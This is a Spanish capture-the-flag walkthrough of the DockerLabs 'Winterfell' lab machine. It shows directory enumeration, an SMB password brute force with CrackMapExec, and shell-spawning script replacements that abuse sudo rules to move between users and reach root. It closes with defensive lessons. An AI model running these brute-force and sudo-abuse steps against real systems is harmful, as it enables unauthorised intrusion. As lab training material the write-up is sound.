# Winterfell — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Zunderrub  
**Fecha de creación:** 16/07/2024  
**Técnicas:** Gobuster · SMB Enumeration · CrackMapExec · Caesar Cipher · SSH · Python sudo abuse · Writable script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — directorio oculto](#2-enumeración-web--directorio-oculto)
3. [Enumeración SMB y fuerza bruta](#3-enumeración-smb-y-fuerza-bruta)
4. [Descifrado de credenciales](#4-descifrado-de-credenciales)
5. [Acceso SSH — usuario jon](#5-acceso-ssh--usuario-jon)
6. [Escalada horizontal — usuario aria](#6-escalada-horizontal--usuario-aria)
7. [Escalada horizontal — usuario daenerys](#7-escalada-horizontal--usuario-daenerys)
8. [Escalada final a root](#8-escalada-final-a-root)
9. [Lección aprendida](#9-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh winterfell.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

---

## 2. Enumeración web — directorio oculto

Accedemos al servidor web y observamos una página temática de *Juego de Tronos*.

Enumeramos directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/dragon
```

Exploramos:

```text
http://172.17.0.2/dragon
```

Encontramos el fichero:

```text
EpisodiosT1
```

Contenido:

```text
seacercaelinvierno
elcaminoreal
lordnieve
...
```

Los textos parecen posibles contraseñas.

Creamos dos listas:

```bash
cat users.txt
```

```text
jon
arya
daenerys
```

```bash
cat passwords.txt
```

```text
seacercaelinvierno
elcaminoreal
lordnieve
...
```

---

## 3. Enumeración SMB y fuerza bruta

Enumeramos recursos SMB:

```bash
smbclient -N -L //172.17.0.2
```

Resultado:

```text
print$
shared
IPC$
```

Realizamos fuerza bruta con CrackMapExec:

```bash
crackmapexec smb 172.17.0.2 \
-u users.txt \
-p passwords.txt
```

Resultado:

```text
jon : seacercaelinvierno
```

Accedemos al recurso compartido:

```bash
smbclient -U 'jon' //172.17.0.2/shared
```

Listamos archivos:

```bash
ls
```

Encontramos:

```text
proteccion_del_reino
```

Descargamos el fichero:

```bash
get proteccion_del_reino
```

---

## 4. Descifrado de credenciales

Leemos el contenido:

```bash
cat proteccion_del_reino
```

Resultado:

```text
Esta es mi contraseña, se encuentra cifrada en ese lenguaje...
```

El texto contiene una contraseña cifrada.

Utilizamos CyberChef para descifrarla.

Herramienta utilizada:

[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)

Resultado obtenido:

```text
HijoDeLaNoche
```

---

## 5. Acceso SSH — usuario jon

Accedemos mediante SSH:

```bash
ssh jon@172.17.0.2
```

Contraseña:

```text
seacercaelinvierno
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

---

## 6. Escalada horizontal — usuario aria

Eliminamos el script original:

```bash
rm -r .mensaje.py
```

Creamos uno nuevo:

```python
import os
os.system("/bin/sh")
```

Damos permisos:

```bash
chmod +x .mensaje.py
```

Ejecutamos como `aria`:

```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```

Verificamos usuario:

```bash
whoami
aria
```

---

## 7. Escalada horizontal — usuario daenerys

Comprobamos nuevos privilegios:

```bash
sudo -l
```

Resultado:

```text
(daenerys) NOPASSWD: /usr/bin/cat /home/daenerys/mensajeParaJon
```

Leemos el fichero:

```bash
sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
```

Resultado:

```text
drakaris!
```

Cambiamos al usuario:

```bash
su daenerys
```

Contraseña:

```text
drakaris!
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

---

## 8. Escalada final a root

Editamos el script permitido:

```bash
nano /home/daenerys/.secret/.shell.sh
```

Contenido añadido:

```bash
#!/bin/bash
bash -p
```

Ejecutamos como root:

```bash
sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 9. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Directorios ocultos accesibles | Filtración de contraseñas |
| SMB expuesto | Acceso a archivos sensibles |
| Contraseñas débiles/reutilizadas | Acceso SSH |
| Script Python ejecutable con sudo | Escalada horizontal |
| Script Bash editable ejecutado como root | Escalada final a root |

**Para defenderse:**

- Restringir acceso a recursos SMB innecesarios.
- Aplicar políticas robustas de contraseñas.
- No almacenar secretos en archivos accesibles.
- Proteger scripts ejecutados mediante sudo.
- Auditar permisos sobre archivos críticos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
